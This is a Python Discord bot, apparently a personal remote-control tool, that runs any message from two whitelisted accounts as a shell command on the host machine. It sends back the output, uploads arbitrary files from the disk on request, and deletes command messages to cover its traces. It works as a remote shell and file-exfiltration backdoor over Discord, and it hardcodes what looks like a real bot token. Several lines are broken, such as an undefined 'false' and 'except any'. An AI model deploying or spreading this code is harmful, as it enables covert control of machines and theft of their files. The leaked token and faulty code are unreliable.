import subprocess
import discord
import os
import sys

BOT_TOKEN = "MTU0NTU0NDAwNzY1NDgzNDIzNg.GVcuXn.SC7AkVwC84P7IBOr3V0i9LkTXT8A1UKwFcDtc0"

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

current_dir = os.getcwd()

program_name = os.path.basename(sys.executable)
program_name = "DiscordCMD []"
isunlock = False
if program_name.split("[")[1][:-1]=="":
    isunlock = True

@client.event
async def on_message(message):
    global current_dir, isunlock
    if message.author.id not in (842920374954098738, 1545544007654834236):
        print(f"/!\\/!\\ Acèss Refusé /!\\/!\\ quelqu'un a essaye de ce connecter sans avoir de permision, id:{message.author.id}")
        isunlock = false
        return
    if message.author.id == 1545544007654834236:
        return
    
    if isunlock:
        command = message.content.strip()

        if command.startswith("cd "):
            new_dir = command[3:].strip().strip('"')

            # Gère les chemins relatifs et absolus
            if not os.path.isabs(new_dir):
                new_dir = os.path.join(current_dir, new_dir)

            new_dir = os.path.abspath(new_dir)

            if os.path.isdir(new_dir):
                current_dir = new_dir
                await message.channel.send(f"Répertoire : `{current_dir}`")
            else:
                await message.channel.send("Dossier introuvable.")

            return

        if command.lower().startswith("getfile "):
            if command[8:].startswith("C:\\"):
                path = command[8:].strip().strip('"')
            else:
                path = current_dir + "\\" + command[8:].strip().strip('"')
            if os.path.exists(path):
                try:
                    await message.channel.send(file=discord.File(path))
                except any:
                    pass
            else:
                text = "Wrong path"
            return
        
        if command == "cls":
            async for msg in message.channel.history(limit=None):
                if msg.author.id == client.user.id:
                    try:
                        await msg.delete()
                    except discord.Forbidden:
                        pass
            return
        
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            cwd=current_dir
        )

        text = result.stdout + result.stderr
        try:
            await message.delete()
        except discord.Forbidden:
            pass

    if message.content == program_name.split("[")[1][:-1]:
        isunlock = True
        text = "Unlocked :D"
        try:
            await message.delete()
        except discord.Forbidden:
            pass
    
    if not text:
        text = f"Code retour : {result.returncode}"

    await message.channel.send(f"```text\n{text[:1900]}\n```")
    print(text)


client.run(BOT_TOKEN)
